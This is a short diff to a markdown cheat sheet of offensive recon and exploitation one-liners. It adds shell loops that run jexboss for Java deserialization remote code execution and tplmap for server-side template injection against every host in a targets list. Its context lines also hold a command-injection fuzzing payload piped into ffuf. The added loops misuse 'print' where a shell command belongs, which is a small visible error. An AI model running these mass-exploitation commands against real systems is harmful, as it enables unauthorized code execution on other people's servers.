@@ -180,6 +180,10 @@ shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " 
 ```
 subfinder -d target.com | httpx | gau | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt; ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
 ```
+### Java Deserialization RCE
+```
+for url in $(cat targets.txt); do python3 jexboss.py -u $url; print $url; done
+```
 --------------
 ## Sensitive Dirs:
 ```
@@ -204,6 +208,11 @@ cat subdomains.txt | gauplus -subs -t 100 -random-agent | sort -u --version-sort
 ### Extract sensitive end-point in JS:
 ```
 cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
+```
+-------------------------
+### SSTI:
+```
+for url in $(cat targets.txt); do python3 tplmap.py -u $url; print $url; done
 ```
 ---------------------------
 ## Portscan without WAF
